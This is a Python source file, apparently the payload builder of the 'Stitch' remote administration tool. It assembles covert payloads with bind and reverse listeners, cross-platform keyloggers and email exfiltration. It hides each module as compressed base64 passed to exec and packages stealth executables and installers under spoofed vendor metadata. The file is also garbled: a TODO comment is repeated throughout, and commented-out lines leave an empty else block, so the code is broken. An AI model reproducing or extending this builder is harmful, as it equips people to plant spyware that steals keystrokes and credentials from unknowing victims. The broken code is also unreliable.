import os
# -*- coding: utf-8 -*-
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
from .stitch_utils import *
# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
from .stitch_pyld_config import *

# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
from .Stitch_Vars.nsis import *
# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
from .Stitch_Vars.makeself import *
# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
from .Stitch_Vars.payload_code import *
# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
from .Stitch_Vars.payload_setup import *

if windows_client():
    import py2exe
    from distutils.core import setup

def assemble_stitch():
    global utils_imports,utils_code

    stini = stitch_ini()
    BIND = stini.get_bool("BIND")
    BHOST = stini.get_value("BHOST")
    BPORT = stini.get_value("BPORT")

    LISTEN = stini.get_bool("LISTEN")
    LHOST = stini.get_value("LHOST")
    LPORT = stini.get_value("LPORT")

    EMAIL = stini.get_value("EMAIL")
    email_pwd_encoded = stini.get_value("EMAIL_PWD")
    EMAIL_PWD = base64.b64decode(email_pwd_encoded).decode('utf-8') if email_pwd_encoded else ""
    KEYLOGGER_BOOT = stini.get_bool("KEYLOGGER_BOOT")

    main_code = ''
    if BIND:
        BHOST = base64.b64encode(BHOST.encode()).decode()
        BPORT = base64.b64encode(BPORT.encode()).decode()
        main_code += add_bind_server(BHOST,BPORT)
    if LISTEN:
        LHOST = base64.b64encode(LHOST.encode()).decode()
        LPORT = base64.b64encode(LPORT.encode()).decode()
        main_code += add_listen_server(LHOST,LPORT)

    if LISTEN and BIND:
        main_code += add_listen_bind_main()
    elif LISTEN:
        main_code += add_listen_main()
    elif BIND:
        main_code += add_bind_main()
    main_code += add_run_main()

    required_imports = get_requirements()

    if windows_client():
        utils_imports    += win_util_imports()
        required_imports += win_util_imports()
        utils_code += win_reg_exists()
    elif osx_client():
        utils_imports    += osx_util_imports()
        required_imports += osx_util_imports()
    else:
        utils_imports    += lnx_util_imports()
        required_imports += lnx_util_imports()
    if KEYLOGGER_BOOT:
        utils_code +=  'nt_kl.start()\n'
    if EMAIL != 'None' and EMAIL_PWD:
        utils_code += get_email(EMAIL, EMAIL_PWD)
        required_imports += email_imports()

    st_main       = main_imports + main_code
    st_utils      = utils_imports + utils_code
    st_protocol   = get_protocol()
    st_encryption = get_encryption()
    st_win_kl     = get_win_keylogger()
    st_osx_kl     = get_osx_keylogger()
    st_lnx_kl     = get_lnx_keylogger()

# TODO: Replace wildcard import with specific imports
    st_main       = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_main.encode())).decode())
# TODO: Replace wildcard import with specific imports
    st_utils      = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_utils.encode())).decode())
# TODO: Replace wildcard import with specific imports
    st_protocol   = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_protocol.encode())).decode())
# TODO: Replace wildcard import with specific imports
    st_encryption = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_encryption.encode())).decode())
# TODO: Replace wildcard import with specific imports
    st_win_kl     = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_win_kl.encode())).decode())
# TODO: Replace wildcard import with specific imports
    st_osx_kl     = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_osx_kl.encode())).decode())
# TODO: Replace wildcard import with specific imports
    st_lnx_kl     = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_lnx_kl.encode())).decode())

    main_script   = os.path.join(configuration_path,'st_main.py')
    utils_script  = os.path.join(configuration_path,'st_utils.py')
    proto_script  = os.path.join(configuration_path,'st_protocol.py')
    reqmnt_script = os.path.join(configuration_path, 'requirements.py')
    encry_script  = os.path.join(configuration_path,'st_encryption.py')
    win_keylg_script  = os.path.join(configuration_path,'st_win_keylogger.py')
    osx_keylg_script  = os.path.join(configuration_path,'st_osx_keylogger.py')
    lnx_keylg_script  = os.path.join(configuration_path,'st_lnx_keylogger.py')

    with open(main_script,'w') as m:
        m.write(st_main)
    with open(utils_script,'w') as u:
        u.write(st_utils)
    with open(proto_script,'w') as m:
        m.write(st_protocol)
    with open(encry_script,'w') as m:
        m.write(st_encryption)
    with open(reqmnt_script,'w') as u:
        u.write(required_imports)
    with open(win_keylg_script,'w') as u:
        u.write(st_win_kl)
    with open(osx_keylg_script,'w') as u:
        u.write(st_osx_kl)
    with open(lnx_keylg_script,'w') as u:
        u.write(st_lnx_kl)

    # st_print("[+] Stitch Modules are now complete.")

def win_gen_payload(dist_dir,icon, dest, cpyr, cmpny, ver, name, desc):

    sys.argv.append('py2exe')

    setup(
        options = {'py2exe': {'bundle_files': 1,
                    'compressed': True,
                    'ascii': False,
                    'dll_excludes':['msvcr71.dll',"tcl85.dll","tk85.dll","QtCore4.dll","QtGui4.dll", "IPHLPAPI.DLL", "NSI.dll",  "WINNSI.DLL",  "WTSAPI32.dll"],
                    'dist_dir':dist_dir,
                    'excludes':['PyQt4','PyQt5','Tkconstants', 'Tkinter']}},


        windows = [{
            "script":'st_main.py',
            "icon_resources": [(1, icon)],
            "dest_base" : dest,
            'copyright': cpyr,
            'company_name': cmpny,
            }],
        zipfile = None,
        version = ver,
        name = name,
        description = desc,
    )
    del sys.argv[-1]

def posix_gen_payload(name,dist_dir,icon=None):
    #
    #add the osx/linux pyinstaller spec information
    #
    if osx_client():
        st_spec = '''
# -*- mode: python -*-

block_cipher = None


a = Analysis(['st_main.py'],
             pathex=['{}'],
             binaries=None,
             datas=None,
             hiddenimports=[],
             hookspath=[],
             runtime_hooks=[],
             excludes=[],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          name='{}',
          debug=False,
          strip=False,
          upx=True,
          console=False )
app = BUNDLE(exe,
             name='{}.app',
             icon="{}",
             bundle_identifier=None,
             info_plist={{'LSUIElement':'True'}},
            )'''.format(os.getcwd(),name,name,icon)
    else:
        st_spec = '''
# -*- mode: python -*-

block_cipher = None


a = Analysis(['st_main.py'],
             pathex=['{}'],
             binaries=None,
             datas=None,
             hiddenimports=[],
             hookspath=[],
             runtime_hooks=[],
             excludes=[],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          name='{}',
          debug=False,
          strip=False,
          upx=True,
          console=False )'''.format(os.getcwd(),name)

    with open('st_main.spec','w') as st:
        st.write(st_spec)
    st_log.info(run_command('pyinstaller --onefile --distpath={} st_main.spec'.format(dist_dir)))

    binary = os.path.join(dist_dir,name)
    binary_dir = os.path.join(dist_dir,'Binaries')
    if not os.path.exists(binary_dir):
        os.makedirs(binary_dir)
    if os.path.exists(binary):
        shutil.copy(binary,binary_dir)
        os.remove(binary)
    else:
        st_log.error('{} was not created from command "pyinstaller --onefile --distpath={} st_main.spec"'.format(binary,dist_dir))

def run_exe_gen(auto_confirm=False, create_installers=False):
    if not os.path.exists(st_config):
        gen_default_st_config()

    if confirm_config(auto_confirm):
        conf_dir = get_conf_dir()
        assemble_stitch()
        
        # Set auto_installers flag for use throughout the function
        auto_installers = create_installers or os.getenv('STITCH_CREATE_INSTALLERS', 'false').lower() in ('true', '1', 'yes')

        #TODO Make OS specific builds windows/linux/os x
    # st_print("[*] Starting exe generation...\n")
        cur_dir = os.getcwd()
        if windows_client():
            os.chdir(configuration_path)
            win_progress = progress_bar(len(win_payload_list))
            win_progress.display()
            for alias in win_payload_list:
                retry = 0
                #st_print("[*] Creating payload with {} configuration...".format(alias))
                while True:
                    try:
                        with nostdout():
                            win_gen_payload(conf_dir,win_payload_Icons[alias],alias,nsis_LegalCopyright[alias],
                                    nsis_CompanyName[alias],nsis_Version[alias],win_payload_Name[alias],win_payload_Description[alias])
                        break
                    except Exception as e:
    # print(e)
                        retry += 1
                        if retry > 3:
    # st_print('[*] Failed more than three times. Moving on to next configuration')
                            break
                        pass
                win_progress.increment(inc_track=1, inc_prog=1, file_inc=False)
            win_progress.complete()
    # st_print("[+] Exe generation is complete.")

            if auto_installers:
                nsis_creation = 'y'
    # st_print("Auto-creating NSIS installers (non-interactive mode)")
            else:
                try:
                    nsis_creation = input("\nWould you like to create NSIS Installers for your payloads? [y/n]: ")
                except (EOFError, KeyboardInterrupt):
                    nsis_creation = 'n'
    # st_print("Skipping NSIS installers (non-interactive mode)")
            
            if nsis_creation.lower().startswith('y'):
                if os.path.exists("C:\\Program Files (x86)\\NSIS\\makensis.exe"):
    # st_print("[*] Creating NSIS Installers...\n")
                    win_progress = progress_bar(len(win_payload_list))
                    win_progress.display()
                    for alias in win_payload_list:
                        #st_print("[*] Creating NSIS installer for {} configured payload...".format(alias))
                        path = nsis_Path[alias]
                        outfile = nsis_ProductName[alias]
                        gen_nsis(conf_dir,alias,outfile,path,elevation_path)
                        win_progress.increment(inc_track=1, inc_prog=1, file_inc=False)
                    win_progress.complete()
                else:
    # st_print('[!] "C:\\Program Files (x86)\\NSIS\\makensis.exe" does not exist.')
    # st_print('[*] To install NSIS go to: "http://nsis.sourceforge.net/Download"')
        elif osx_client():
            osx_progress = progress_bar(len(osx_payload_list))
            osx_progress.display()
            for alias in osx_payload_list:
                posix_gen_payload(alias,conf_dir,icon=osx_payload_Icons[alias])
                osx_progress.increment(inc_track=1, inc_prog=1, file_inc=False)
            osx_progress.complete()

            # Check for auto-confirm or environment variable  
            if auto_installers:
                mkself_creation = 'y'
    # st_print("Auto-creating Makeself installers (non-interactive mode)")
            else:
                try:
                    mkself_creation = input("\nWould you like to create Makeself Installers for your payloads? [y/n]: ")
                except (EOFError, KeyboardInterrupt):
                    mkself_creation = 'n'
    # st_print("Skipping Makeself installers (non-interactive mode)")
            
            if mkself_creation.lower().startswith('y'):
    # st_print("[*] Creating Makeself Installers...\n")
                osx_progress = progress_bar(len(osx_payload_list))
                osx_progress.display()
                for alias in osx_payload_list:
                    gen_makeself(conf_dir,alias)
                    osx_progress.increment(inc_track=1, inc_prog=1, file_inc=False)
                osx_progress.complete()
        else:
            lnx_progress = progress_bar(len(lnx_payload_list))
            lnx_progress.display()
            for alias in lnx_payload_list:
                posix_gen_payload(alias,conf_dir)
                lnx_progress.increment(inc_track=1, inc_prog=1, file_inc=False)
            lnx_progress.complete()

            # Check for auto-confirm or environment variable  
            if auto_installers:
                mkself_creation = 'y'
    # st_print("Auto-creating Makeself installers (non-interactive mode)")
            else:
                try:
                    mkself_creation = input("\nWould you like to create Makeself Installers for your payloads? [y/n]: ")
                except (EOFError, KeyboardInterrupt):
                    mkself_creation = 'n'
    # st_print("Skipping Makeself installers (non-interactive mode)")
            
            if mkself_creation.lower().startswith('y'):
    # st_print("[*] Creating Makeself Installers...\n")
                lnx_progress = progress_bar(len(lnx_payload_list))
                lnx_progress.display()
                for alias in lnx_payload_list:
                    gen_makeself(conf_dir,alias)
                    lnx_progress.increment(inc_track=1, inc_prog=1, file_inc=False)
                lnx_progress.complete()

        os.chdir(cur_dir)
        if os.path.exists(os.path.join(conf_dir,'w9xpopen.exe')):
            if windows_client():
                run_command('del {}'.format(os.path.join(conf_dir,'w9xpopen.exe')))
            else:
                run_command('rm -f {}'.format(os.path.join(conf_dir,'w9xpopen.exe')))
    # st_print('[+] Payload creation is complete: {}\n'.format(conf_dir))
